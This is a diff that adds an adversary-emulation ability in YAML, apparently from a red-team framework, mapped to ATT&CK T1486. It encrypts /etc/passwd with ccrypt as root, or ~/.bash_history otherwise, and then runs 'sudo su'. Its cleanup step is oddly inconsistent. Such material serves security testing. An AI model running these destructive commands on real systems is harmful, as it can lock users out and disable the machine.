@@ -1,0 +1,20 @@
+- description: 'Attempts to encrypt data on target systems as root to simulate an
+    inturruption authentication to target system. If root permissions are not available
+    then attempts to encrypt data within user''s home directory.
+
+    '
+  id: 752f0b88233950aee6c1c249e89ee941
+  name: Encrypt files using ccrypt (Linux)
+  platforms:
+    linux:
+      sh:
+        cleanup: if [[ $USER == "root" ]]; then mv /tmp/passwd /etc/passwd; else cp
+          /tmp/passwd ~/.bash_history; fi
+        command: if [[ $USER == "root" ]]; then $which_ccencrypt /etc/passwd; file
+          /etc/passwd.cpt; sudo su; else $which_ccencrypt ~/.bash_history; file ~/.bash_history.cpt;
+          sudo su; fi
+        payloads: []
+  tactic: impact
+  technique:
+    attack_id: T1486
+    name: Data Encrypted for Impact
